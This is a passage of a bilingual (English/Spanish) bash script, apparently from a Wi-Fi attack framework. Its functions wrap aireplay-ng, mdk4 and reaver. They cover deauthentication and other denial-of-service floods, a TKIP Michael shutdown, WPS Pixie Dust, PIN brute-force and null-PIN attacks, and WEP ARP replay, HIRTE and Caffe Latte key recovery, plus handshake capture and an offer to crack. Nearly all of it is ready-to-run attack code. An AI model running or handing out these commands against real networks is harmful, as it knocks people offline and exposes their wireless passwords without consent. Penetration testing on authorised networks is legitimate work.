puntos de acceso cercanos de 2.4GHz, presiona Ctrl+C para parar y continuar...\\n\"\n    fi\n    wash -2 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &\n\n  elif [ \"${band}\" == \"a\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Scanning nearby 5GHz access points, press Ctrl+C to stop and continue...\\n\"\n    else\n      color_output_ln \"*\" \"Escaneando puntos de acceso cercanos de 5GHz, presiona Ctrl+C para parar y continuar...\\n\"\n    fi\n    wash -5 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &\n\n  elif [ \"${band}\" == \"ag\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Scanning nearby 2.4GHz and 5GHz access points, press Ctrl+C to stop and continue...\\n\"\n    else\n      color_output_ln \"*\" \"Escaneando puntos de acceso cercanos de 2.4GHz and 5GHz, presiona Ctrl+C para parar y continuar...\\n\"\n    fi\n    wash -2 -5 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &\n  fi\n\n  wash_PID=$!\n  wait ${wash_PID} 2>/dev/null\n  trap keep_exit_c INT\n}\n\nfunction list_aps(){\n  if [ -f \"/usr/share/wef/cache/wps_scan.txt\" ]; then\n    echo; cat /usr/share/wef/cache/wps_scan.txt\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"APs list not found. Execute ${yC}scan${blueC} to scan nearby APs\"\n    else\n      color_output_ln \"*\" \"Lista de APs no encontrada. Ejecuta ${yC}scan${blueC} para escanear los APs cercanos\"\n    fi\n  fi\n}\n\n\n#\n#\n# Attacks functions start here\n#\n#\n\n#\n# DoS attacks\n#\n\n# Deauthentication attack main function (aireplay-ng)\nfunction deauthentication_attack(){\n  clear\n  color_output_ln \"*\" \"In this attack, the devices connected to an access point will be kicked off in order to try to catch a handshake\"\n  scan_aps # Scan nearby APs\n  \n  log_back_to_menu\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  echo\n  while true; do\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_no_line \"*\" \"Do you want to deauthenticate all clients (${yC}1${blueC}) or an especific client (${yC}2${blueC})? (default=1): \" && read deauth_option\n    else\n      color_output_no_line \"*\" \"¿Quieres deautenticar a todos los clientes (${yC}1${blueC}) o solo a un cliente específico (${yC}2${blueC})? (por defecto=1): \" && read deauth_option\n    fi\n\n    if [ \"${deauth_option}\" == \"back\" ]; then\n      return\n\n    elif [ \"${deauth_option}\" == \"exit\" ] || [ \"$deauth_option\" == \"quit\" ]; then\n      ctrl_c\n\n    elif [ \"${deauth_option}\" != \"1\" ] && [ \"${deauth_option}\" != \"2\" ] && [ \"${deauth_option}\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_ln \"X\" \"Invalid option\"\n      else\n        color_output_ln \"X\" \"Opción inválida\"\n      fi\n\n    else\n      break\n    fi\n  done\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n\n  if [ \"${deauth_option}\" == \"1\" ] || [ ! \"${deauth_option}\" ]; then\n    deauth_all_clients\n  elif [ \"${deauth_option}\" == \"2\" ]; then\n    deauth_one_client\n  fi\n}\n\nfunction deauth_all_clients(){\n  ask_to_capture_handshakes\n\n  default=\"10\"\n  ask_frames\n  if [ \"$frames_to_send\" == \"back\" ]; then\n    if [ \"$c_h\" == \"true\" ]; then\n      kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n    fi\n    return\n  fi; sleep 0.1\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Deauthentication attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de Deautenticación, presiona Ctrl+C para pararlo\"\n  fi\n\n  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel\n  sleep 0.2\n\n  if [ \"$verbose\" == \"false\" ]; then\n    aireplay-ng -0 ${frames_to_send} -a \"${ap_bssid}\" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null # add \"-D\" to avoid errors\n  else\n    echo\n    aireplay-ng -0 ${frames_to_send} -a \"${ap_bssid}\" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null # add \"-D\" to avoid errors\n  fi\n\n  if [ \"${c_h}\" == \"true\" ]; then # Enter here is user wants to capture handshakes\n    echo\n    if [ \"$lang\" == \"en\" ]; then\n      progress_bar 4 2.5 \"*\" \"Waiting while clients reconect to AP in order to capture handshakes\"\n    else\n      progress_bar 4 2.5 \"*\" \"Esperando mientras los clientes se reconectan al AP para capturar los handshakes\"\n    fi\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n    move_capture_files\n    check_captured_handshakes\n    log_capture_files\n  fi\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  ask_to_crack_handshakes\n\n  if [ \"$crack_option\" == \"y\" ] || [ \"$crack_option\" == \"yes\" ] || [ \"$crack_option\" == \"s\" ] || [ \"$crack_option\" == \"si\" ]; then\n    crack_handshake\n  elif [ \"$crack_option\" == \"exit\" ] || [ \"$crack_option\" == \"quit\" ]; then\n    ctrl_c\n  else\n    reset_info\n    keep_exit\n  fi\n}\n\nfunction deauth_one_client(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output \"*\" \"Scanning devices, do not close airodump-ng window...\"\n  else\n    color_output \"*\" \"Escaneando dispositivos, no cierres la ventana de airodump-ng...\"\n  fi\n\n  if [ \"$airmon_check_kill\" == \"true\" ]; then\n    xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry 107x36-10+10 -T \"Airodump-ng\" -xrm 'XTerm*selectToClipboard: true' -e \"airodump-ng -c ${channel} --bssid ${ap_bssid} -w \\\"/usr/share/wef/cache/airodump-devices\\\" ${netCard}\" 2>/dev/null &\n  else\n    airodump-ng -c ${channel} --bssid ${ap_bssid} -w \"/usr/share/wef/cache/airodump-devices\" ${netCard} 2>/dev/null &\n  fi\n  airodump_PID=$!\n\n  if [ \"$lang\" == \"en\" ]; then\n    press_enter \"Press [Enter] to stop scanning devices and continue \"\n  else\n    press_enter \"Presiona [Enter] para dejar de escanear dispositivos y continuar \"\n  fi; echo\n\n  kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n  format_csv_clients_info\n\n  echo\n  ask_target_client\n  if [ \"$client_number\" == \"back\" ]; then\n    reset_info\n    return\n  fi\n\n  clients=\"$(cat /usr/share/wef/cache/airodump-devices-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)\"\n  clients_length=\"$(echo \"${clients}\" | wc -l)\"\n\n  if [[ $client_number -le $clients_length ]]; then\n    client_mac=$(echo \"${clients}\" | sed \"${client_number}q;d\" | awk '{print $1}')\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"X\" \"Invalid number, returning to main menu...\"\n    else\n      color_output_ln \"X\" \"Número inválido, volviendo al menú principal...\"\n    fi; sleep 1\n\n    return\n  fi\n\n  default=\"10\"\n  ask_frames\n  if [ \"$frames_to_send\" == \"back\" ]; then\n    reset_info\n    return\n  fi; sleep 0.1\n\n  ask_to_capture_handshakes\n\n  sleep 0.9\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n\n  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Deauthentication attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de Deautenticación, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} &>/dev/null\n  else\n    echo\n    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} 2>/dev/null\n  fi\n\n  if [ \"${c_h}\" == \"true\" ]; then\n    echo\n    if [ \"$lang\" == \"en\" ]; then\n      progress_bar 4 2.2 \"*\" \"Waiting while client reconects to AP in order to capture handshake\"\n    else\n      progress_bar 4 2.2 \"*\" \"Esperando mientras el cliente se reconecta al AP para capturar su handshake\"\n    fi\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n    move_capture_files\n    check_captured_handshakes\n    log_capture_files\n  fi\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  ask_to_crack_handshakes\n\n  if [ \"$crack_option\" == \"y\" ] || [ \"$crack_option\" == \"yes\" ] || [ \"$crack_option\" == \"s\" ] || [ \"$crack_option\" == \"si\" ]; then\n    crack_handshake\n  elif [ \"$crack_option\" == \"exit\" ] || [ \"$crack_option\" == \"quit\" ]; then\n    ctrl_c\n  else\n    reset_info\n    keep_exit\n  fi\n}\n\n# WIDS Confusion attack (mdk4)\nfunction wids_confusion_attack(){\n  clear\n  color_output_ln \"*\" \"In this attack, you can cross-connect clients to multiple WDS nodes or fake rogue APs to confuse the access point\"\n  scan_aps\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  default=\"120s\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"Do you want to activate the Zero_Chaos' WIDS exploit? (default=no) (${yC}yes${blueC}/${yC}no${blueC}): \" && read zero_chaos\n  else\n    color_output_no_line \"*\" \"Quieres activar el exploit de WIDS Zero_Chaos? (por defecto=no) (${yC}si${blueC}/${yC}no${blueC}): \" && read zero_chaos\n  fi\n\n  if [ \"$zero_chaos\" == \"y\" ] || [ \"$zero_chaos\" == \"yes\" ] || [ \"$zero_chaos\" == \"s\" ] || [ \"$zero_chaos\" == \"si\" ]; then\n    zero_chaos=\"true\"\n  elif [ \"$zero_chaos\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting WIDS Confusion attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de Confusión WIDS, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$zero_chaos\" != \"true\" ] && [ \"$verbose\" == \"false\" ]; then\n    mdk4 ${netCard} w -e \"${essid}\" -c ${channel} &>/dev/null &\n  elif [ \"$zero_chaos\" == \"true\" ] && [ \"$verbose\" == \"false\" ]; then\n    mdk4 ${netCard} w -e \"${essid}\" -c ${channel} -z &>/dev/null &\n  elif [ \"$zero_chaos\" != \"true\" ] && [ \"$verbose\" == \"true\" ]; then\n    mdk4 ${netCard} w -e \"${essid}\" -c ${channel} &\n  elif [ \"$zero_chaos\" == \"true\" ] && [ \"$verbose\" == \"true\" ]; then\n    mdk4 ${netCard} w -e \"${essid}\" -c ${channel} -z &\n  fi\n\n  mdk4_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n# Authentication DoS attack (mdk4)\nfunction authentication_attack(){\n  clear\n  color_output_ln \"*\" \"In this attack, authentication frames are sent to the access point trying to overload it, causing it to freeze or reset sometimes\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    reset_info\n    return\n  fi\n  parse_info\n\n  ask_to_capture_handshakes\n\n  default=\"120s\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    reset_info\n    return\n  fi\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Authentication DoS attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de Autenticación DoS, presiona Ctrl+C para pararlo\"\n  fi\n\n  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel\n\n  if [ \"$verbose\" == \"false\" ]; then\n    mdk4 ${netCard} a -i ${ap_bssid} &>/dev/null &\n  elif [ \"$verbose\" == \"true\" ]; then\n    echo\n    mdk4 ${netCard} a -i ${ap_bssid} &\n  fi\n\n  mdk4_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null\n  \n  if [ \"$c_h\" == \"true\" ]; then\n    echo\n    if [ \"$lang\" == \"en\" ]; then\n      progress_bar 4 2.2 \"*\" \"Waiting while clients reconect to AP in order to capture handshakes\"\n    else\n      progress_bar 4 2.2 \"*\" \"Esperando mientras los clientes se reconectan al AP para capturar los handshakes\"\n    fi\n\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n    move_capture_files\n    check_captured_handshakes\n    log_capture_files\n  fi\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n# Beacon Flood attack (mdk4)\nfunction beacon_flood_attack(){\n  clear\n  color_output_ln \"*\" \"In this attack, a lot of beacon frames are sent to create fake access points, this may disrupt the availability of a wireless network\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  default=\"300s\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"File containing names of APs to create (leave empty for random names): \" && read beacon_option\n  else\n    color_output_no_line \"*\" \"Archivo con los nombres de los APs a crear (dejalo en blanco para nombres aleatorios): \" && read beacon_option\n  fi\n\n  if [ \"$beacon_option\" == \"back\" ]; then\n    reset_info\n    return\n  elif [ \"$beacon_option\" == \"exit\" ] || [ \"$beacon_option\" == \"quit\" ]; then\n    ctrl_c\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Beacon Flood attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque Beacon Flood, presiona Ctrl+C para pararlo\"\n  fi\n\n  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel\n  sleep 0.2\n\n  if [ ! \"$beacon_option\" ] && [ \"$verbose\" == \"false\" ]; then\n    mdk4 ${netCard} b -c ${channel} -s 200 &>/dev/null &\n\n  elif [ ! \"$beacon_option\" ] && [ \"$verbose\" == \"true\" ]; then\n    echo\n    mdk4 ${netCard} b -c ${channel} -s 200 &\n\n  elif [ \"$beacon_option\" ] && [ \"$verbose\" == \"false\" ]; then\n    mdk4 ${netCard} b -c ${channel} -s 200 -f \"${beacon_option}\" &>/dev/null &\n\n  elif [ \"$beacon_option\" ] && [ \"$verbose\" == \"true\" ]; then\n    echo\n    mdk4 ${netCard} b -c ${channel} -s 200 -f \"${beacon_option}\" &\n  fi\n\n  mdk4_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n# TKIP (Michael Shutdown Exploitation) attack (mdk4)\nfunction tkip_attack(){\n  clear\n  color_output_ln \"*\" \"In this attack, random or duplicate packets are sent to different QoS queues which can trigger Michael Countermeasures on TKIP access points, leading to a one-minute AP shutdown\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  \n  default=\"120s\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting TKIP (Michael Shutdown Exploitation) attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque TKIP (Michael Shutdown Exploitation), presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    mdk4 ${netCard} m -t ${ap_bssid} -w 1 -n 1024 -s 1024 &>/dev/null &\n\n  elif [ \"$verbose\" == \"true\" ]; then\n    echo\n    mdk4 ${netCard} m -t ${ap_bssid} -w 1 -n 1024 -s 1024 &\n  fi\n\n  mdk4_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n\n#\n# WPS attacks\n#\n\n# WPS Pixie Dust attack (reaver)\nfunction pixie_dust_attack(){\n  clear\n  color_output_ln \"*\" \"This attack tries to figure out the WPS PIN by discovering the two main key nonces so that the WPA password can be found\"\n  scan_aps_wps # Scan nearby APs\n  log_back_to_menu\n\n  ask_bssid\n  if [ \"${ap_bssid}\" == \"back\" ]; then\n    return\n  fi\n  parse_info_wps\n\n  default=\"2m\"\n  ask_time\n  if [ \"${attack_time}\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Pixie Dust attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque Pixie Dust, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    if [ \"$channel\" -le 14 ]; then\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -K 1 -N -v &\n    else\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -K 1 -N -v -5 &\n    fi\n  elif [ \"$verbose\" == \"true\" ]; then\n    if [ \"$channel\" -le 14 ]; then\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -K 1 -N -vv &\n    else\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -K 1 -N -vv -5 &\n    fi\n  fi\n\n  reaver_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null\n\n  write_informative_log\n  log_completed\n  reset_info\n  keep_exit\n}\n\n# WPS PIN Bruteforce attack (reaver)\nfunction pin_bruteforce_attack(){\n  clear\n  color_output_ln \"*\" \"This attack tries to bruteforce the WPS PIN so that the WPA password can be discovered\"\n  scan_aps_wps # Scan nearby APs\n  log_back_to_menu\n\n  ask_bssid\n  if [ \"${number}\" == \"back\" ]; then\n    return\n  fi\n  parse_info_wps\n\n  default=\"5m\"\n  ask_time\n  if [ \"${attack_time}\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting PIN bruteforce attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de fuerza bruta de PIN, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    if [ \"$channel\" -le 14 ]; then\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -L -f -N -d 2 -v &\n    else\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -L -f -N -d 2 -v -5 &\n    fi\n  elif [ \"$verbose\" == \"true\" ]; then\n    if [ \"$channel\" -le 14 ]; then\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -L -f -N -d 2 -vv &\n    else\n      reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -L -f -N -d 2 -vv -5 &\n    fi\n  fi\n\n  reaver_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null\n\n  write_informative_log\n  log_completed\n  reset_info\n  keep_exit\n}\n\n# Null Pin attack (reaver)\nfunction null_pin_attack(){\n  clear\n  color_output_ln \"*\" \"This attack sends a null PIN to check if the access point receives it as a valid PIN so that the WPA password can be discovered\"\n  scan_aps_wps # Scan nearby APs\n  log_back_to_menu\n\n  ask_bssid\n  if [ \"$ap_bssid\" == \"back\" ]; then\n    return\n  fi\n  parse_info_wps\n\n  default=\"1m\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Null Pin attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de Pin nulo, presiona Ctrl+C para pararlo\"\n  fi\n\n  # Perform attack\n  if [ \"$channel\" -le 14 ]; then\n    reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -L -f -N -g 1 -d 2 -p '' -vv &\n  else\n    reaver -i \"${netCard}\" -b \"${ap_bssid}\" -c \"${channel}\" -L -f -N -g 1 -d 2 -p '' -vv -5 &\n  fi\n  reaver_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null\n\t\n  write_informative_log\n  log_completed\n  reset_info\n  keep_exit\n}\n\n\n#\n# WEP attacks\n#\n\n# ARP Replay attack (aireplay-ng)\nfunction arp_replay_attack(){\n  clear\n  color_output_ln \"*\" \"This attack consists in sending tons of ARP packets to capture enough IVs to crack the WEP key\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n  ask_to_capture_ivs\n\n  default=\"5m\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Replay attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de Replay, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    aireplay-ng -3 -x 1024 -g 1000000 -b ${ap_bssid} -h ${current_mac} ${netCard} &>/dev/null &\n  elif [ \"$verbose\" == \"true\" ]; then\n    echo\n    aireplay-ng -3 -x 1024 -g 1000000 -b ${ap_bssid} -h ${current_mac} ${netCard} &\n  fi\n\n  aireplay_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null\n\n  echo\n  if [ \"${c_i}\" == \"true\" ]; then # Enter here is user wants to capture IVs\n    sleep 0.5\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n    move_capture_files\n    log_capture_files\n  fi\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n# HIRTE attack (aireplay-ng)\nfunction hirte_attack(){\n  clear\n  color_output_ln \"*\" \"This attack combines the fragmentation attack and the caffe latte attack to crack the WEP key\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n  ask_to_capture_ivs\n\n  default=\"5m\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting HIRTE attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque HIRTE, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    aireplay-ng -7 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &>/dev/null &\n  elif [ \"$verbose\" == \"true\" ]; then\n    echo\n    aireplay-ng -7 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &\n  fi\n\n  aireplay_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null\n\n  echo\n  if [ \"${c_i}\" == \"true\" ]; then # Enter here is user wants to capture IVs\n    sleep 0.5\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n    echo\n    move_capture_files\n    log_capture_files\n  fi\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n# Caffe Latte attack (aireplay-ng)\nfunction caffe_latte_attack(){\n  clear\n  color_output_ln \"*\" \"The Cafe Latte attack allows you to obtain a WEP key from a client system, this is done by capturing an ARP packet, manipulating it and then send it back to the client\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n  \n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n  ask_to_capture_ivs\n\n  default=\"5m\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Caffe Latte attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque Caffe Latte, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    aireplay-ng -6 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &>/dev/null &\n  elif [ \"$verbose\" == \"true\" ]; then\n    echo\n    aireplay-ng -6 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &\n  fi\n\n  aireplay_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null\n\n  echo\n  if [ \"${c_i}\" == \"true\" ]; then # Enter here is user wants to capture IVs\n    sleep 0.5\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n    echo\n    move_capture_files\n    log_capture_files\n  fi\n\n  rm replay_arp-*.cap 2>/dev/null\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n# Fake Authentication attack (aireplay-ng)\nfunction fake_authentication_attack(){\n  clear\n  color_output_ln \"*\" \"This attack creates fake devices to make the access point generate new IVs so that the WEP key can be discovered\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n  \n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    